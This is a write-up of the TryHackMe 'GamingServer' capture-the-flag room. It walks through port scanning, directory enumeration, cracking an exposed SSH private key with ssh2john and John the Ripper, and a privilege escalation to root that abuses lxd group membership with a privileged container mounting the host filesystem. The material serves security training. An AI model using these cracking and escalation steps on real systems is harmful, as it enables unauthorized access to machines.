---
layout: post
title: "GamingServer"
date: 2022-10-08
categories: [Tryhackme, Easy-THM]
tags: [private-key, ssh2john, password-cracking, lxd]
image: ../../assets/img/posts/gamingserver.png 

---

## Description

An Easy Boot2Root box for beginners

|**Room**|[GamingServer](https://tryhackme.com/room/gamingserver)|
|:---:|:---:|
|**OS**|Linux|
|**Difficulty**|Easy|
|**Creator**|[SuitGuy](https://tryhackme.com/p/SuitGuy)|

---

Deploy the machine and quickly scan the ports with rustscan,

```bash
rustscan -a 10.10.144.153
```

![image](https://user-images.githubusercontent.com/67465230/186084579-4a9c8175-5e02-474a-be12-49dabf93c007.png)

This reveals 2 open ports. Lets scan them using nmap,

```bash
nmap -sC -sV -p22,80 10.10.144.153 -oN nmap.txt
```

![image](https://user-images.githubusercontent.com/67465230/186084629-457a49dd-529c-4a34-b638-d6d7e9ebca9a.png)

Looks like port 22 is running ssh service and port 80 is running a webserver. Starting enumeration of port 80.

Visit http://10.10.144.153,

![image](https://user-images.githubusercontent.com/67465230/186084672-75f75382-069a-428f-9cbf-3839cec30079.png)

and we get stumble on a primitively build webpage, which has nothing interesting in it except it's source code page.

Scrolling down, there is a comment for John(username enumeration),

![image](https://user-images.githubusercontent.com/67465230/186084721-7036d186-cc9c-43ce-b135-ebc8e8fd8b9b.png)

Now, we need to find hidden directories,

```bash
dirsearch -u http://10.10.144.153 -w /usr/share/seclists/Discovery/Web-Content/common.txt -i 200,301 2>/dev/null
```

![image](https://user-images.githubusercontent.com/67465230/186084760-bc9edc9f-25b4-44de-af74-ae87d0098757.png)

we got 2 hidden directories.

Visit http://10.10.144.153/secret,

![image](https://user-images.githubusercontent.com/67465230/186084800-cad2b60a-5e38-469e-bf37-b9410fbc95a8.png)

we got a file named **secretKey**. Maybe there is something useful for us. Let's find out.

Opening this file and I saw the private id_rsa key,

![image](https://user-images.githubusercontent.com/67465230/186084857-6b884158-96c1-4125-a0d8-1d927deda901.png)

Copy this key into secretkey file and we will use ssh2john script to convert this key into crackable hash, 

```bash
/usr/share/john/ssh2john.py secretkey > crackme
```

Now using JTR, we can crack this hash and obtain the password,

```bash
john crackme --wordlist=/usr/share/wordlists/rockyou.txt
```

![image](https://user-images.githubusercontent.com/67465230/186084905-8e49dbc0-e4f5-41d0-91ce-4d47867c92b6.png)

we got the password to login via ssh.

Now, changing the mode of the secretkey to give it suitable permissions, 

```bash
chmod 600 secretkey
```

Now we need to hop into machine as john user using secretkey,

```bash
ssh -i secretkey john@10.10.6.96
```

![image](https://user-images.githubusercontent.com/67465230/186084950-948e24eb-b6c6-4248-b094-28a217283448.png)

and we got in.

Enumerating directory and we got user flag,

![image](https://user-images.githubusercontent.com/67465230/186084993-7dd7907a-224d-4f0d-a204-66c59e277309.png)

Now, Issuing `id`command tells us that we are john user and we are in **lxd** group,

![image](https://user-images.githubusercontent.com/67465230/186085033-f744f349-312b-4096-9e1e-99edb2b0e43e.png)

By viewing that user john is in lxd group means we can abuse the lxd functionality to become system user. There is a great article on [Lxd Privilege Escalation](https://www.hackingarticles.in/lxd-privilege-escalation/)

Now, we have to download the alpine builder from github and follow some commands,

```bash
git clone  https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
./build-alpine
```

This will build up the package for us.

Now that our package is built, we need to start a python server to host this package on remote machine, `python3 -m http.server`

Navigating to /tmp directory and downloading this file using wget command,

![image](https://user-images.githubusercontent.com/67465230/186085073-4ee731b4-d751-41c3-a7d0-b8403b3412d6.png)

At first, we need to import the image into lxc image list as myimage,

```bash
lxc image import ./alpine-v3.14-x86_64-20210810_1625.tar.gz --alias myimage
```

![image](https://user-images.githubusercontent.com/67465230/186085119-73358c85-02fd-4669-b023-9f94ccf212e9.png)

Now, listing all images again,

```bash
lxc image list
```

![image](https://user-images.githubusercontent.com/67465230/186085146-6d1ab25e-fb6f-47fb-82d3-b12a0e3d52d0.png)

our image is now successfully added.

Now, to exploit the lxd, we need to execute command below,

```bash
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh
id
```

>In the above commands we created a container named gaming having all the privileges and mounted the /root directory to /mnt/root then executed /bin/sh

and when we issue `id` command, it will show us that we are **root**.

Navigating to directory we mounted,

![image](https://user-images.githubusercontent.com/67465230/186085187-f0c3fdcd-fd28-4af9-b6a2-a79195268c6f.png)

we can see the system path with many directories (from root user perspective.).

Navigate to /mnt/root/root will let us have our root flag.
